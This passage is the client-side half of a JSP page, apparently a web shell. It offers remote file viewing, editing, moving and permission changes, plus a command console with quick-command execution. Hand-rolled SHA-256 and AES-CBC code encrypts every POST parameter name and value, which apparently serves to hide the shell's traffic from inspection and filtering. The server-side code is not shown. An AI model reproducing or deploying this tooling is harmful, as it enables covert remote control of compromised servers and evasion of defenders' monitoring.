            <form method="POST">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="path" value="<%= escapeHtml(currentPath) %>">
                <input type="hidden" name="tab" value="files">
                <input type="hidden" name="filepath" id="chmodFilePath">
                <div class="form-group">
                    <label>Permissions (e.g., rwxr-xr-x):</label>
                    <input type="text" name="permissions" id="chmodPermissions" required>
                </div>
                <button type="submit" class="btn btn-primary">Apply</button>
            </form>
        </div>
    </div>
    
    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
            document.querySelectorAll('.panel').forEach(function(p) { p.classList.remove('active'); });
            
            var tabs = document.querySelectorAll('.tab');
            for (var i = 0; i < tabs.length; i++) {
                if (tabs[i].getAttribute('onclick').indexOf(tab) >= 0) {
                    tabs[i].classList.add('active');
                    break;
                }
            }
            
            document.getElementById(tab + '-panel').classList.add('active');
        }
        
        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
        }
        
        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }
        
        var originalFileContent = '';
        var currentFilePath = '';
        var currentFileName = '';
        
        function encryptParams(params) {
            var result = [];
            for (var key in params) {
                if (params.hasOwnProperty(key)) {
                    if (PARAM_ENCRYPTION_ENABLED) {
                        var encName = encryptAES(key);
                        var encValue = encryptAES(params[key]);
                        result.push(encodeURIComponent(encName) + '=' + encodeURIComponent(encValue));
                    } else {
                        result.push(encodeURIComponent(key) + '=' + encodeURIComponent(params[key]));
                    }
                }
            }
            return result.join('&');
        }
        
        function viewFile(filepath, filename) {
            currentFilePath = filepath;
            currentFileName = filename;
            
            document.getElementById('viewEditModalTitle').textContent = 'View File';
            document.getElementById('viewEditFileName').textContent = filename;
            document.getElementById('viewEditFilePath').value = filepath;
            
            document.getElementById('viewEditContent').style.display = 'block';
            document.getElementById('viewEditForm').style.display = 'none';
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.pathname, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var parser = new DOMParser();
                    var doc = parser.parseFromString(xhr.responseText, 'text/html');
                    var messageEl = doc.querySelector('.message.file');
                    if (messageEl) {
                        originalFileContent = messageEl.textContent;
                        document.getElementById('viewEditFileContent').value = originalFileContent;
                        document.getElementById('viewEditFileContentEdit').value = originalFileContent;
                    }
                    showModal('viewEditModal');
                }
            };
            var params = {
                'action': 'read',
                'filepath': filepath,
                'path': '<%= escapeHtml(currentPath) %>'
            };
            xhr.send(encryptParams(params));
        }
        
        function enableEditing() {
            document.getElementById('viewEditModalTitle').textContent = 'Edit File';
            document.getElementById('viewEditContent').style.display = 'none';
            document.getElementById('viewEditForm').style.display = 'block';
            document.getElementById('viewEditFileContentEdit').focus();
        }
        
        function discardChanges() {
            if (confirm('Discard all changes?')) {
                document.getElementById('viewEditModalTitle').textContent = 'View File';
                document.getElementById('viewEditFileContentEdit').value = originalFileContent;
                document.getElementById('viewEditContent').style.display = 'block';
                document.getElementById('viewEditForm').style.display = 'none';
            }
        }
        
        function saveFileChanges() {
            var content = document.getElementById('viewEditFileContentEdit').value;
            document.getElementById('viewEditFormContent').value = content;
            var form = document.getElementById('viewEditForm');
            form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
        }
        
        function moveFile(filepath, filename) {
            document.getElementById('moveFileName').textContent = filename;
            document.getElementById('moveFilePath').value = filepath;
            document.getElementById('moveNewPath').value = filepath;
            showModal('moveModal');
        }
        
        function changePermissions(filepath, currentPerms) {
            document.getElementById('chmodFilePath').value = filepath;
            document.getElementById('chmodPermissions').value = currentPerms.substring(1);
            showModal('chmodModal');
        }
        
        function executeQuickCommand(cmd) {
            var form = document.querySelector('.console-input');
            form.querySelector('input[name="command"]').value = cmd;
            var submitBtn = form.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.click();
            } else {
                form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
            }
        }
        
        function clearConsole() {
            if (confirm('Clear console history?')) {
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = window.location.pathname;
                
                var actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'clearConsole';
                form.appendChild(actionInput);
                
                var pathInput = document.createElement('input');
                pathInput.type = 'hidden';
                pathInput.name = 'path';
                pathInput.value = '<%= escapeHtml(currentPath) %>';
                form.appendChild(pathInput);
                
                var tabInput = document.createElement('input');
                tabInput.type = 'hidden';
                tabInput.name = 'tab';
                tabInput.value = 'console';
                form.appendChild(tabInput);
                
                document.body.appendChild(form);
                form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
            }
        }
        
        document.querySelectorAll('.modal').forEach(function(modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    modal.classList.remove('active');
                }
            });
        });
        
        function toggleTheme() {
            var currentTheme = document.documentElement.getAttribute('data-theme');
            var newTheme = currentTheme === 'dark' ? 'light' : 'dark';
            document.documentElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
        }
        
        var PARAM_ENCRYPTION_ENABLED = <%= PARAM_ENCRYPTION_ENABLED %>;
        var ENCRYPTION_KEY = localStorage.getItem('encryptionKey') || '<%= ENCRYPTION_KEY %>';
        var ENCRYPTION_ENCODING = '<%= ENCRYPTION_ENCODING %>';
        
        localStorage.setItem('encryptionKey', ENCRYPTION_KEY);
        
        function sha256(str) {
            function rightRotate(value, amount) {
                return (value >>> amount) | (value << (32 - amount));
            }
            var mathPow = Math.pow;
            var maxWord = mathPow(2, 32);
            var i, j;
            var result = '';
            var words = [];
            var asciiBitLength = str.length * 8;
            var hash = [];
            var k = [];
            var primeCounter = 0;
            var isComposite = {};
            for (var candidate = 2; primeCounter < 64; candidate++) {
                if (!isComposite[candidate]) {
                    for (i = 0; i < 313; i += candidate) {
                        isComposite[i] = candidate;
                    }
                    hash[primeCounter] = (mathPow(candidate, 0.5) * maxWord) | 0;
                    k[primeCounter++] = (mathPow(candidate, 1 / 3) * maxWord) | 0;
                }
            }
            str += '\x80';
            while (str.length % 64 - 56) str += '\x00';
            for (i = 0; i < str.length; i++) {
                j = str.charCodeAt(i);
                if (j >> 8) return;
                words[i >> 2] |= j << ((3 - i) % 4) * 8;
            }
            words[words.length] = ((asciiBitLength / maxWord) | 0);
            words[words.length] = (asciiBitLength);
            for (j = 0; j < words.length;) {
                var w = words.slice(j, j += 16);
                var oldHash = hash;
                hash = hash.slice(0, 8);
                for (i = 0; i < 64; i++) {
                    var w15 = w[i - 15], w2 = w[i - 2];
                    var a = hash[0], e = hash[4];
                    var temp1 = hash[7]
                        + (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25))
                        + ((e & hash[5]) ^ ((~e) & hash[6]))
                        + k[i]
                        + (w[i] = (i < 16) ? w[i] : (
                                w[i - 16]
                                + (rightRotate(w15, 7) ^ rightRotate(w15, 18) ^ (w15 >>> 3))
                                + w[i - 7]
                                + (rightRotate(w2, 17) ^ rightRotate(w2, 19) ^ (w2 >>> 10))
                            ) | 0
                        );
                    var temp2 = (rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22))
                        + ((a & hash[1]) ^ (a & hash[2]) ^ (hash[1] & hash[2]));
                    hash = [(temp1 + temp2) | 0].concat(hash);
                    hash[4] = (hash[4] + temp1) | 0;
                }
                for (i = 0; i < 8; i++) {
                    hash[i] = (hash[i] + oldHash[i]) | 0;
                }
            }
            for (i = 0; i < 8; i++) {
                for (j = 3; j + 1; j--) {
                    var b = (hash[i] >> (j * 8)) & 255;
                    result += ((b < 16) ? 0 : '') + b.toString(16);
                }
            }
            return result;
        }
        
        function deriveKey(password) {
            var hash = sha256(password);
            var key = [];
            for (var i = 0; i < 32; i += 2) {
                key.push(parseInt(hash.substr(i, 2), 16));
            }
            return key.slice(0, 16);
        }
        
        function aesEncrypt(key, iv, plaintext) {
            var sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
            var rcon = [0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];
            function addRoundKey(state, roundKey) {
                for (var i = 0; i < 16; i++) state[i] ^= roundKey[i];
            }
            function subBytes(state) {
                for (var i = 0; i < 16; i++) state[i] = sbox[state[i]];
            }
            function shiftRows(state) {
                var t = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = t;
                t = state[2]; state[2] = state[10]; state[10] = t; t = state[6]; state[6] = state[14]; state[14] = t;
                t = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = state[3]; state[3] = t;
            }
            function mixColumns(state) {
                function xtime(x) { return ((x << 1) ^ (((x >> 7) & 1) * 0x1b)) & 0xff; }
                for (var i = 0; i < 16; i += 4) {
                    var s0 = state[i], s1 = state[i + 1], s2 = state[i + 2], s3 = state[i + 3];
                    var t = s0 ^ s1 ^ s2 ^ s3;
                    state[i] ^= t ^ xtime(s0 ^ s1);
                    state[i + 1] ^= t ^ xtime(s1 ^ s2);
                    state[i + 2] ^= t ^ xtime(s2 ^ s3);
                    state[i + 3] ^= t ^ xtime(s3 ^ s0);
                }
            }
            function expandKey(key) {
                var keySchedule = key.slice();
                for (var i = 16; i < 176; i += 4) {
                    var t = keySchedule.slice(i - 4, i);
                    if (i % 16 === 0) {
                        t = [sbox[t[1]] ^ rcon[i / 16], sbox[t[2]], sbox[t[3]], sbox[t[0]]];
                    }
                    for (var j = 0; j < 4; j++) {
                        keySchedule[i + j] = keySchedule[i + j - 16] ^ t[j];
                    }
                }
                return keySchedule;
            }
            function encryptBlock(block, keySchedule) {
                var state = block.slice();
                addRoundKey(state, keySchedule.slice(0, 16));
                for (var round = 1; round < 10; round++) {
                    subBytes(state);
                    shiftRows(state);
                    mixColumns(state);
                    addRoundKey(state, keySchedule.slice(round * 16, (round + 1) * 16));
                }
                subBytes(state);
                shiftRows(state);
                addRoundKey(state, keySchedule.slice(160, 176));
                return state;
            }
            var keySchedule = expandKey(key);
            var paddedLength = Math.ceil((plaintext.length + 1) / 16) * 16;
            var padded = [];
            for (var i = 0; i < plaintext.length; i++) {
                padded.push(plaintext.charCodeAt(i));
            }
            var padValue = paddedLength - plaintext.length;
            for (var i = 0; i < padValue; i++) {
                padded.push(padValue);
            }
            var encrypted = iv.slice();
            var prevBlock = iv.slice();
            for (var i = 0; i < padded.length; i += 16) {
                var block = padded.slice(i, i + 16);
                for (var j = 0; j < 16; j++) {
                    block[j] ^= prevBlock[j];
                }
                var encBlock = encryptBlock(block, keySchedule);
                encrypted = encrypted.concat(encBlock);
                prevBlock = encBlock;
            }
            return encrypted;
        }
        
        function encodeBytes(data, encoding) {
            if (encoding.toLowerCase() === 'base32') {
                var base32Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
                var result = '';
                var buffer = 0;
                var bitsLeft = 0;
                for (var i = 0; i < data.length; i++) {
                    buffer = (buffer << 8) | data[i];
                    bitsLeft += 8;
                    while (bitsLeft >= 5) {
                        result += base32Chars.charAt((buffer >> (bitsLeft - 5)) & 0x1F);
                        bitsLeft -= 5;
                    }
                }
                if (bitsLeft > 0) {
                    result += base32Chars.charAt((buffer << (5 - bitsLeft)) & 0x1F);
                }
                while (result.length % 8 !== 0) {
                    result += '=';
                }
                return result;
            } else if (encoding.toLowerCase() === 'hex') {
                return Array.from(data).map(function(b) {
                    return ('0' + (b & 0xFF).toString(16)).slice(-2);
                }).join('');
            } else {
                return btoa(String.fromCharCode.apply(null, data));
            }
        }
        
        function encryptAES(plaintext) {
            var keyBytes = deriveKey(ENCRYPTION_KEY);
            var iv = [];
            for (var i = 0; i < 16; i++) {
                iv.push(Math.floor(Math.random() * 256));
            }
            var encrypted = aesEncrypt(keyBytes, iv, plaintext);
            return encodeBytes(encrypted, ENCRYPTION_ENCODING);
        }
        
        function encryptFormData(formData) {
            var encrypted = new FormData();
            for (var pair of formData.entries()) {
                var encName = encryptAES(pair[0]);
                var encValue = encryptAES(pair[1]);
                encrypted.append(encName, encValue);
            }
            return encrypted;
        }
        
        document.addEventListener('submit', function(e) {
            if (!PARAM_ENCRYPTION_ENABLED) return true;
            var form = e.target;
            if (form.method.toUpperCase() !== 'POST') return true;
            
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            
            var formData = new FormData(form);
            var xhr = new XMLHttpRequest();
            var formAction = form.getAttribute('action');
            if (!formAction || formAction.indexOf('?') >= 0) {
                formAction = window.location.pathname;
            }
            xhr.open('POST', formAction, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    document.open();
                    document.write(xhr.responseText);
                    document.close();
                }
            };
            
            if (form.enctype === 'multipart/form-data') {
                var encryptedFormData = new FormData();
                for (var pair of formData.entries()) {
                    if (pair[1] instanceof File) {
                        encryptedFormData.append(encryptAES('file'), pair[1]);
                    } else {
                        var encName = encryptAES(pair[0]);
                        var encValue = encryptAES(pair[1]);
                        encryptedFormData.append(encName, encValue);
                    }
                }
                xhr.send(encryptedFormData);
            } else {
                var encryptedData = encryptFormData(formData);
                var body = '';
                for (var pair of encryptedData.entries()) {
                    if (body.length > 0) body += '&';
                    body += encodeURIComponent(pair[0]) + '=' + encodeURIComponent(pair[1]);
                }
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(body);
            }
            return false;
        }, true);
        
        window.addEventListener('DOMContentLoaded', function() {
            var theme = localStorage.getItem('theme') || 'light';
            document.documentElement.setAttribute('data-theme', theme);
            
            var activeTab = '<%= activeTab %>';
            if (activeTab) {
                switchTab(activeTab);
            }
        });
    </script>
</body>
</html>

